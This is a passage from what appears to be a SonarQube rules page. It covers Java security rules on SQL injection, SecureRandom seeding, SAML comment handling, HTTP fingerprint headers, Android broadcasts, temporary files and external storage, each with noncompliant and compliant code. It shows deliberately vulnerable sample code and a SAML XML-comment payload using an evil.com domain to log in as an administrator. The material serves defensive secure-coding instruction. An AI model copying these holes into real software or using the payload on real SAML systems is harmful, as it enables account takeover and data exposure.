  Insufficient Cryptography </li><li> <a href="https://cwe.mitre.org/data/definitions/323" rel="nofollow">MITRE, CWE-323</a> - Reusing a Nonce, Key Pair in Encryption </li><li> <a href="https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-38a.pdf" rel="nofollow">NIST, SP-800-38A</a> - Recommendation for Block Cipher
  Modes of Operation </li><li> <a href="https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-38c.pdf" rel="nofollow">NIST, SP-800-38C</a> - Recommendation for Block Cipher
  Modes of Operation: The CCM Mode for Authentication and Confidentiality </li><li> <a href="https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-38d.pdf" rel="nofollow">NIST, SP-800-38D</a> - Recommendation for Block Cipher
  Modes of Operation: Galois/Counter Mode (GCM) and GMAC </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S2077">
              java:S2077
            </a>
          </td>
          <td>
            <details>
              <p>Formatted SQL queries can be difficult to maintain, debug and can increase the risk of SQL injection when concatenating untrusted values into the
query. However, this rule doesn’t detect SQL injections (unlike rule <a href="/organizations/sopra-steria/rules?open&#61;javasecurity%3AS3649&amp;rule_key&#61;javasecurity%3AS3649" rel="nofollow">S3649</a>), the goal is only to highlight complex/formatted queries.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> Some parts of the query come from untrusted values (like user inputs). </li><li> The query is repeated/duplicated in other parts of the code. </li><li> The application must support different types of relational databases. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Use <a href="https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html" rel="nofollow">parameterized queries, prepared
  statements, or stored procedures</a> and bind variables to SQL query parameters. </li><li> Consider using ORM frameworks if there is a need to have an abstract layer to access data. </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
public User getUser(Connection con, String user) throws SQLException {

  Statement stmt1 &#61; null;
  Statement stmt2 &#61; null;
  PreparedStatement pstmt;
  try {
    stmt1 &#61; con.createStatement();
    ResultSet rs1 &#61; stmt1.executeQuery(&#34;GETDATE()&#34;); // No issue; hardcoded query

    stmt2 &#61; con.createStatement();
    ResultSet rs2 &#61; stmt2.executeQuery(&#34;select FNAME, LNAME, SSN &#34; &#43;
                 &#34;from USERS where UNAME&#61;&#34; &#43; user);  // Sensitive

    pstmt &#61; con.prepareStatement(&#34;select FNAME, LNAME, SSN &#34; &#43;
                 &#34;from USERS where UNAME&#61;&#34; &#43; user);  // Sensitive
    ResultSet rs3 &#61; pstmt.executeQuery();

    //...
}

public User getUserHibernate(org.hibernate.Session session, String data) {

  org.hibernate.Query query &#61; session.createQuery(
            &#34;FROM students where fname &#61; &#34; &#43; data);  // Sensitive
  // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public User getUser(Connection con, String user) throws SQLException {

  Statement stmt1 &#61; null;
  PreparedStatement pstmt &#61; null;
  String query &#61; &#34;select FNAME, LNAME, SSN &#34; &#43;
                 &#34;from USERS where UNAME&#61;?&#34;
  try {
    stmt1 &#61; con.createStatement();
    ResultSet rs1 &#61; stmt1.executeQuery(&#34;GETDATE()&#34;);

    pstmt &#61; con.prepareStatement(query);
    pstmt.setString(1, user);  // Good; PreparedStatements escape their inputs.
    ResultSet rs2 &#61; pstmt.executeQuery();

    //...
  }
}

public User getUserHibernate(org.hibernate.Session session, String data) {

  org.hibernate.Query query &#61;  session.createQuery(&#34;FROM students where fname &#61; ?&#34;);
  query &#61; query.setParameter(0,data);  // Good; Parameter binding escapes all input

  org.hibernate.Query query2 &#61;  session.createQuery(&#34;FROM students where fname &#61; &#34; &#43; data); // Sensitive
  // ...
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/89" rel="nofollow">MITRE, CWE-89</a> - Improper Neutralization of Special Elements used in an SQL Command
  </li><li> <a href="https://cwe.mitre.org/data/definitions/564" rel="nofollow">MITRE, CWE-564</a> - SQL Injection: Hibernate </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/943" rel="nofollow">MITRE, CWE-943</a> - Improper Neutralization of Special Elements in Data Query Logic </li><li> <a href="https://wiki.sei.cmu.edu/confluence/x/ITdGBQ" rel="nofollow">CERT, IDS00-J.</a> - Prevent SQL injection </li><li> <a href="https://www.sans.org/top25-software-errors/#cat1" rel="nofollow">SANS Top 25</a> - Insecure Interaction Between Components </li><li> Derived from FindSecBugs rules <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_JPA" rel="nofollow">Potential SQL/JPQL Injection
  (JPA)</a>, <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_JDO" rel="nofollow">Potential SQL/JDOQL Injection (JDO)</a>, <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_HIBERNATE" rel="nofollow">Potential SQL/HQL Injection (Hibernate)</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S4347">
              java:S4347
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>The <code>java.security.SecureRandom</code> class provides a strong random number generator (RNG) appropriate for cryptography. However, seeding it
with a constant or another predictable value will weaken it significantly. In general, it is much safer to rely on the seed provided by the
<code>SecureRandom</code> implementation.</p>
<p>This rule raises an issue when <code>SecureRandom.setSeed()</code> or <code>SecureRandom(byte[])</code> are called with a seed that is either one
of:</p>
<ul><li> a constant </li><li> the system time </li></ul>
<h3>Noncompliant code example</h3>
<pre>
SecureRandom sr &#61; new SecureRandom();
sr.setSeed(123456L); // Noncompliant
int v &#61; sr.next(32);

sr &#61; new SecureRandom(&#34;abcdefghijklmnop&#34;.getBytes(&#34;us-ascii&#34;)); // Noncompliant
v &#61; sr.next(32);
</pre>
<h3>Compliant solution</h3>
<pre>
SecureRandom sr &#61; new SecureRandom();
int v &#61; sr.next(32);
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/330" rel="nofollow">MITRE, CWE-330</a> - Use of Insufficiently Random Values </li><li> <a href="https://cwe.mitre.org/data/definitions/332" rel="nofollow">MITRE, CWE-332</a> - Insufficient Entropy in PRNG </li><li> <a href="https://cwe.mitre.org/data/definitions/336" rel="nofollow">MITRE, CWE-336</a> - Same Seed in Pseudo-Random Number Generator (PRNG) </li><li> <a href="https://cwe.mitre.org/data/definitions/337" rel="nofollow">MITRE, CWE-337</a> - Predictable Seed in Pseudo-Random Number Generator (PRNG) </li><li> <a href="https://wiki.sei.cmu.edu/confluence/display/java/MSC63-J.&#43;Ensure&#43;that&#43;SecureRandom&#43;is&#43;properly&#43;seeded" rel="nofollow">CERT, MSC63J.</a> - Ensure that
  SecureRandom is properly seeded </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S5679">
              java:S5679
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>In 2018, Duo Security found a new vulnerability class that affects SAML-based single sign-on (SSO) systems and this led to the following
vulnerabilities being disclosed: <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2017-11427" rel="nofollow">CVE-2017-11427</a>, <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2017-11428" rel="nofollow">CVE-2017-11428</a>, <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2017-11429" rel="nofollow">CVE-2017-11429</a>, <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2017-11430" rel="nofollow">CVE-2017-11430</a>, <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2018-0489" rel="nofollow">CVE-2018-0489</a>, <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2018-7340" rel="nofollow">CVE-2018-7340</a>.</p>
<p>From a specially crafted <code>&lt;SAMLResponse&gt;</code> file, an attacker having already access to the SAML system with his own account can
bypass the authentication mechanism and be authenticated as another user.</p>
<p>This is due to the fact that SAML protocol rely on XML format and how the underlying XML parser interprets XML comments.</p>
<p>If an attacker manage to change the <code>&lt;NameID&gt;</code> field identifying the authenticated user with XML comments, he can exploit the
vulnerability.</p>
<p>Here is an example of a potential payload:</p>
<pre>
&lt;SAMLResponse&gt;
  [...]
  &lt;Subject&gt;
    &lt;NameID&gt;admin&#64;domain.com&lt;!----&gt;.evil.com&lt;/NameID&gt;
  &lt;/Subject&gt;
  [...]
&lt;/SAMLResponse&gt;
</pre>
<p>The attacker will manage to generate a valid &lt;SAMLResponse&gt; content with the account &#34;admin&#64;domain.com.evil.com&#34;. He will modify it with XML
comments to finally be authenticated as &#34;admin&#64;domain.com&#34;. To prevent this vulnerability on application using Spring Security SAML relying on
OpenSAML2, XML comments should be ignored thanks to the property <code>ignoreComments</code> set to <code>true</code>.</p>
<h3>Noncompliant code example</h3>
<pre>
import org.opensaml.xml.parse.BasicParserPool;
import org.opensaml.xml.parse.ParserPool;
import org.opensaml.xml.parse.StaticBasicParserPool;

public ParserPool parserPool() {
  StaticBasicParserPool staticBasicParserPool &#61; new StaticBasicParserPool();
  staticBasicParserPool.setIgnoreComments(false); // Noncompliant: comments are not ignored during parsing opening the door to exploit the vulnerability
  return staticBasicParserPool;
}
</pre>
<pre>
public ParserPool parserPool() {
  BasicParserPool basicParserPool &#61; new BasicParserPool();
  basicParserPool.setIgnoreComments(false); // Noncompliant
  return basicParserPool;
}
</pre>
<h3>Compliant solution</h3>
<pre>
public ParserPool parserPool() {
  return new StaticBasicParserPool(); // Compliant: &#34;ignoreComments&#34; is set to &#34;true&#34; in StaticBasicParserPool constructor
}
</pre>
<pre>
public ParserPool parserPool() {
  return new BasicParserPool();  // Compliant: &#34;ignoreComments&#34; is set to &#34;true&#34; in BasicParserPool constructor
}
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/" rel="nofollow">OWASP Top 10 2021 Category A6</a> - Vulnerable and Outdated
  Components </li><li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" rel="nofollow">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication" rel="nofollow">OWASP Top 10 2017 Category A2</a> - Broken Authentication
  </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities" rel="nofollow">OWASP Top 10 2017 Category A9</a> -
  Using Components with Known Vulnerabilities </li><li> <a href="https://duo.com/blog/duo-finds-saml-vulnerabilities-affecting-multiple-implementations" rel="nofollow">Duo Finds SAML Vulnerabilities Affecting
  Multiple Implementations</a> </li><li> <a href="https://spring.io/blog/2018/03/01/spring-security-saml-and-this-week-s-saml-vulnerability" rel="nofollow">Spring Security SAML and this week’s SAML
  Vulnerability</a> </li><li> <a href="https://github.com/spring-projects/spring-security-saml/issues/228" rel="nofollow">Spring Security SAML: Issue #228</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S5689">
              java:S5689
            </a>
          </td>
          <td>
            <details>
              <p>Disclosing technology fingerprints allows an attacker to gather information about the technologies used to develop the web application and to
perform relevant security assessments more quickly (like the identification of known vulnerable components).</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The <code>x-powered-by</code> HTTP header or similar is used by the application. </li><li> Technologies used by the application are confidential and should not be easily guessed. </li></ul>
<p>There is a risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to not disclose technologies used on a website, with <code>x-powered-by</code> HTTP header for example.</p>
<p>In addition, it’s better to completely disable this HTTP header rather than setting it a random value.</p>
<h2>Sensitive Code Example</h2>
<pre>
public ResponseEntity&lt;String&gt; testResponseEntity() {
  HttpHeaders responseHeaders &#61; new HttpHeaders();
  responseHeaders.set(&#34;x-powered-by&#34;, &#34;myproduct&#34;); // Sensitive

  return new ResponseEntity&lt;String&gt;(&#34;foo&#34;, responseHeaders, HttpStatus.CREATED);
}
</pre>
<h2>Compliant Solution</h2>
<p>Don’t use <code>x-powered-by</code> or <code>Server</code> HTTP header or any other means disclosing fingerprints of the application.</p>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/01-Information_Gathering/08-Fingerprint_Web_Application_Framework.html" rel="nofollow">OWASP Testing Guide - OTG-INFO-008</a> - Fingerprint Web Application Framework </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/200" rel="nofollow">MITRE, CWE-200</a> - Information Exposure </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S5322">
              java:S5322
            </a>
          </td>
          <td>
            <details>
              <p>Android applications can receive broadcasts from the system or other applications. Receiving intents is security-sensitive. For example, it has led
in the past to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2019-1677" rel="nofollow">CVE-2019-1677</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2015-1275" rel="nofollow">CVE-2015-1275</a> </li></ul>
<p>Receivers can be declared in the manifest or in the code to make them context-specific. If the receiver is declared in the manifest Android will
start the application if it is not already running once a matching broadcast is received. The receiver is an entry point into the application.</p>
<p>Other applications can send potentially malicious broadcasts, so it is important to consider broadcasts as untrusted and to limit the applications
that can send broadcasts to the receiver.</p>
<p>Permissions can be specified to restrict broadcasts to authorized applications. Restrictions can be enforced by both the sender and receiver of a
broadcast. If permissions are specified when registering a broadcast receiver, then only broadcasters who were granted this permission can send a
message to the receiver.</p>
<p>This rule raises an issue when a receiver is registered without specifying any broadcast permission.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The data extracted from intents is not sanitized. </li><li> Intents broadcast is not restricted. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Restrict the access to broadcasted intents. See the <a href="https://developer.android.com/guide/components/broadcasts.html#restricting_broadcasts_with_permissions" rel="nofollow">Android documentation</a> for more
information.</p>
<h2>Sensitive Code Example</h2>
<pre>
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.IntentFilter;
import android.os.Build;
import android.os.Handler;
import android.support.annotation.RequiresApi;

public class MyIntentReceiver {

    &#64;RequiresApi(api &#61; Build.VERSION_CODES.O)
    public void register(Context context, BroadcastReceiver receiver,
                         IntentFilter filter,
                         String broadcastPermission,
                         Handler scheduler,
                         int flags) {
        context.registerReceiver(receiver, filter); // Sensitive
        context.registerReceiver(receiver, filter, flags); // Sensitive

        // Broadcasting intent with &#34;null&#34; for broadcastPermission
        context.registerReceiver(receiver, filter, null, scheduler); // Sensitive
        context.registerReceiver(receiver, filter, null, scheduler, flags); // Sensitive
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.IntentFilter;
import android.os.Build;
import android.os.Handler;
import android.support.annotation.RequiresApi;

public class MyIntentReceiver {

    &#64;RequiresApi(api &#61; Build.VERSION_CODES.O)
    public void register(Context context, BroadcastReceiver receiver,
                         IntentFilter filter,
                         String broadcastPermission,
                         Handler scheduler,
                         int flags) {

        context.registerReceiver(receiver, filter, broadcastPermission, scheduler);
        context.registerReceiver(receiver, filter, broadcastPermission, scheduler, flags);
    }
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x11-v6-interaction_with_the_environment" rel="nofollow">Mobile AppSec Verification
  Standard</a> - Platform Interaction Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m1-improper-platform-usage" rel="nofollow">OWASP Mobile Top 10 2016 Category M1</a> - Improper
  Platform Usage </li><li> <a href="https://cwe.mitre.org/data/definitions/925" rel="nofollow">MITRE, CWE-925</a> - Improper Verification of Intent by Broadcast Receiver </li><li> <a href="https://cwe.mitre.org/data/definitions/926" rel="nofollow">MITRE, CWE-926</a> - Improper Export of Android Application Components </li><li> <a href="https://www.sans.org/top25-software-errors/#cat1" rel="nofollow">SANS Top 25</a> - Insecure Interaction Between Components </li><li> <a href="https://developer.android.com/guide/components/broadcasts.html#restricting_broadcasts_with_permissions" rel="nofollow">Android documentation</a> -
  Broadcast Overview - Security considerations and best practices </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S5443">
              java:S5443
            </a>
          </td>
          <td>
            <details>
              <p>Operating systems have global directories where any user has write access. Those folders are mostly used as temporary storage areas like
<code>/tmp</code> in Linux based systems. An application manipulating files from these folders is exposed to race conditions on filenames: a malicious
user can try to create a file with a predictable name before the application does. A successful attack can result in other files being accessed,
modified, corrupted or deleted. This risk is even higher if the application runs with elevated permissions.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul><li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2012-2451" rel="nofollow">CVE-2012-2451</a> </li><li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2015-1838" rel="nofollow">CVE-2015-1838</a> </li></ul>
<p>This rule raises an issue whenever it detects a hard-coded path to a publicly writable directory like <code>/tmp</code> (see examples bellow). It
also detects access to environment variables that point to publicly writable directories, e.g., <code>TMP</code> and <code>TMPDIR</code>.</p>
<ul><li> <code>/tmp</code> </li><li> <code>/var/tmp</code> </li><li> <code>/usr/tmp</code> </li><li> <code>/dev/shm</code> </li><li> <code>/dev/mqueue</code> </li><li> <code>/run/lock</code> </li><li> <code>/var/run/lock</code> </li><li> <code>/Library/Caches</code> </li><li> <code>/Users/Shared</code> </li><li> <code>/private/tmp</code> </li><li> <code>/private/var/tmp</code> </li><li> <code>\Windows\Temp</code> </li><li> <code>\Temp</code> </li><li> <code>\TMP</code> </li></ul>
<h2>Ask Yourself Whether</h2>
<ul><li> Files are read from or written into a publicly writable folder </li><li> The application creates files with predictable names into a publicly writable folder </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Use a dedicated sub-folder with tightly controlled permissions </li><li> Use secure-by-design APIs to create temporary files. Such API will make sure:
    <ul><li> The generated filename is unpredictable </li><li> The file is readable and writable only by the creating user ID </li><li> The file descriptor is not inherited by child processes </li><li> The file will be destroyed as soon as it is closed </li></ul>  </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
new File(&#34;/tmp/myfile.txt&#34;); // Sensitive
Paths.get(&#34;/tmp/myfile.txt&#34;); // Sensitive

java.io.File.createTempFile(&#34;prefix&#34;, &#34;suffix&#34;); // Sensitive, will be in the default temporary-file directory.
java.nio.file.Files.createTempDirectory(&#34;prefix&#34;); // Sensitive, will be in the default temporary-file directory.
</pre>
<pre>
Map&lt;String, String&gt; env &#61; System.getenv();
env.get(&#34;TMP&#34;); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
new File(&#34;/myDirectory/myfile.txt&#34;);  // Compliant

File.createTempFile(&#34;prefix&#34;, &#34;suffix&#34;, new File(&#34;/mySecureDirectory&#34;));  // Compliant

if(SystemUtils.IS_OS_UNIX) {
  FileAttribute&lt;Set&lt;PosixFilePermission&gt;&gt; attr &#61; PosixFilePermissions.asFileAttribute(PosixFilePermissions.fromString(&#34;rwx------&#34;));
  Files.createTempFile(&#34;prefix&#34;, &#34;suffix&#34;, attr); // Compliant
}
else {
  File f &#61; Files.createTempFile(&#34;prefix&#34;, &#34;suffix&#34;).toFile();  // Compliant
  f.setReadable(true, true);
  f.setWritable(true, true);
  f.setExecutable(true, true);
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/377" rel="nofollow">MITRE, CWE-377</a> - Insecure Temporary File </li><li> <a href="https://cwe.mitre.org/data/definitions/379" rel="nofollow">MITRE, CWE-379</a> - Creation of Temporary File in Directory with Incorrect Permissions
  </li><li> <a href="https://owasp.org/www-community/vulnerabilities/Insecure_Temporary_File" rel="nofollow">OWASP, Insecure Temporary File</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S5445">
              java:S5445
            </a>
          </td>
          <td>
            <details>
              <p>Temporary files are considered insecurely created when the file existence check is performed separately from the actual file creation. Such a
situation can occur when creating temporary files using normal file handling functions or when using dedicated temporary file handling functions that
are not atomic.</p>
<h2>Why is this an issue?</h2>
<p>Creating temporary files in a non-atomic way introduces race condition issues in the application’s behavior. Indeed, a third party can create a
given file between when the application chooses its name and when it creates it.</p>
<p>In such a situation, the application might use a temporary file that it does not entirely control. In particular, this file’s permissions might be
different than expected. This can lead to trust boundary issues.</p>
<h3>What is the potential impact?</h3>
<p>Attackers with control over a temporary file used by a vulnerable application will be able to modify it in a way that will affect the application’s
logic. By changing this file’s Access Control List or other operating system-level properties, they could prevent the file from being deleted or
emptied. They may also alter the file’s content before or while the application uses it.</p>
<p>Depending on why and how the affected temporary files are used, the exploitation of a race condition in an application can have various
consequences. They can range from sensitive information disclosure to more serious application or hosting infrastructure compromise.</p>
<h4>Information disclosure</h4>
<p>Because attackers can control the permissions set on temporary files and prevent their removal, they can read what the application stores in them.
This might be especially critical if this information is sensitive.</p>
<p>For example, an application might use temporary files to store users&#39; session-related information. In such a case, attackers controlling those
files can access session-stored information. This might allow them to take over authenticated users&#39; identities and entitlements.</p>
<h4>Attack surface extension</h4>
<p>An application might use temporary files to store technical data for further reuse or as a communication channel between multiple components. In
that case, it might consider those files part of the trust boundaries and use their content without additional security validation or sanitation. In
such a case, an attacker controlling the file content might use it as an attack vector for further compromise.</p>
<p>For example, an application might store serialized data in temporary files for later use. In such a case, attackers controlling those files&#39;
content can change it in a way that will lead to an insecure deserialization exploitation. It might allow them to execute arbitrary code on the
application hosting server and take it over.</p>
<h2>How to fix it</h2>
<h3>Code examples</h3>
<p>The following code example is vulnerable to a race condition attack because it creates a temporary file using an unsafe API function.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
import java.io.File;
import java.io.IOException;

protected void Example() throws IOException {
    File tempDir;
    tempDir &#61; File.createTempFile(&#34;&#34;, &#34;.&#34;);
    tempDir.delete();
    tempDir.mkdir();  // Noncompliant
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;

protected void Example() throws IOException {
    Path tempPath &#61; Files.createTempDirectory(&#34;&#34;);
    File tempDir &#61; tempPath.toFile();
}
</pre>
<h3>How does this work?</h3>
<p>Applications should create temporary files so that no third party can read or modify their content. It requires that the files&#39; name, location, and
permissions are carefully chosen and set. This can be achieved in multiple ways depending on the applications&#39; technology stacks.</p>
<h4>Use a secure API function</h4>
<p>Temporary files handling APIs generally provide secure functions to create temporary files. In most cases, they operate in an atomical way,
creating and opening a file with a unique and unpredictable name in a single call. Those functions can often be used to replace less secure
alternatives without requiring important development efforts.</p>
<p>Here, the example compliant code uses the safer <code>Files.createTempDirectory</code> function to manage the creation of temporary
directories.</p>
<h4>Strong security controls</h4>
<p>Temporary files can be created using unsafe functions and API as long as strong security controls are applied. Non-temporary file-handling
functions and APIs can also be used for that purpose.</p>
<p>In general, applications should ensure that attackers can not create a file before them. This turns into the following requirements when creating
the files:</p>
<ul><li> Files should be created in a non-public directory. </li><li> File names should be unique. </li><li> File names should be unpredictable. They should be generated using a cryptographically secure random generator. </li><li> File creation should fail if a target file already exists. </li></ul>
<p>Moreover, when possible, it is recommended that applications destroy temporary files after they have finished using them.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul><li> <a href="https://owasp.org/www-community/vulnerabilities/Insecure_Temporary_File" rel="nofollow">OWASP</a> - Insecure Temporary File </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP</a> - Top 10 2021 - A01:2021 - Broken Access Control </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities" rel="nofollow">OWASP</a> - Top 10 2017 - A9:2017 -
  Using Components with Known Vulnerabilities </li><li> <a href="https://cwe.mitre.org/data/definitions/377" rel="nofollow">MITRE</a> - CWE-377: Insecure Temporary File </li><li> <a href="https://cwe.mitre.org/data/definitions/379" rel="nofollow">MITRE</a> - CWE-379: Creation of Temporary File in Directory with Incorrect Permissions
  </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S5324">
              java:S5324
            </a>
          </td>
          <td>
            <details>
              <p>Storing data locally is a common task for mobile applications. Such data includes files among other things. One convenient way to store files is to
use the external file storage which usually offers a larger amount of disc space compared to internal storage.</p>
<p>Files created on the external storage are globally readable and writable. Therefore, a malicious application having the permissions
<code>WRITE_EXTERNAL_STORAGE</code> or <code>READ_EXTERNAL_STORAGE</code> could try to read sensitive information from the files that other
applications have stored on the external storage.</p>
<p>External storage can also be removed by the user (e.g when based on SD card) making the files unavailable to the application.</p>
<h2>Ask Yourself Whether</h2>
<p>Your application uses external storage to:</p>
<ul><li> store files that contain sensitive data. </li><li> store files that are not meant to be shared with other application. </li><li> store files that are critical for the application to work. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Use internal storage whenever possible as the system prevents other apps from accessing this location. </li><li> Only use external storage if you need to share non-sensitive files with other applications. </li><li> If your application has to use the external storage to store sensitive data, make sure it encrypts the files using <a href="https://developer.android.com/reference/androidx/security/crypto/EncryptedFile" rel="nofollow">EncryptedFile</a>. </li><li> Data coming from external storage should always be considered untrusted and should be validated. </li><li> As some external storage can be removed, make sure to never store files on it that are critical for the usability of your application. </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
import android.content.Context;

public class AccessExternalFiles {

    public void accessFiles(Context context) {
        context.getExternalFilesDir(null); // Sensitive
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
import android.content.Context;

public class AccessExternalFiles {

    public void accessFiles(Context context) {
        context.getFilesDir();
    }
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" rel="nofollow">OWASP Top 10 2021 Category A4</a> - Insecure Design </li><li> <a href="https://developer.android.com/training/articles/security-tips#ExternalStorage" rel="nofollow">Android Security tips on external file storage</a>
  </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x07-v2-data_storage_and_privacy_requirements" rel="nofollow">Mobile AppSec
  Verification Standard</a> - Data Storage and Privacy Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m2-insecure-data-storage" rel="nofollow">OWASP Mobile Top 10 2016 Category M2</a> - Insecure
  Data Storage </li><li> <a href="https://cwe.mitre.org/data/definitions/312" rel="nofollow">MITRE, CWE-312</a> - Cleartext Storage of Sensitive Information </li><li> <a href="https://www.sans.org/top25-software-errors/#cat2" rel="nofollow">SANS Top 25</a> - Risky Resource Management </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S6418">
              java:S6418
            </a>
          </td>
          <td>
            <details>
              <p>Because it is easy to extract strings from an application source code or binary, secrets should not be hard-coded. This is particularly true for
applications that are distributed or that are open-source.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2022-25510" rel="nofollow">CVE-2022-25510</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2021-42635" rel="nofollow">CVE-2021-42635</a> </li></ul>
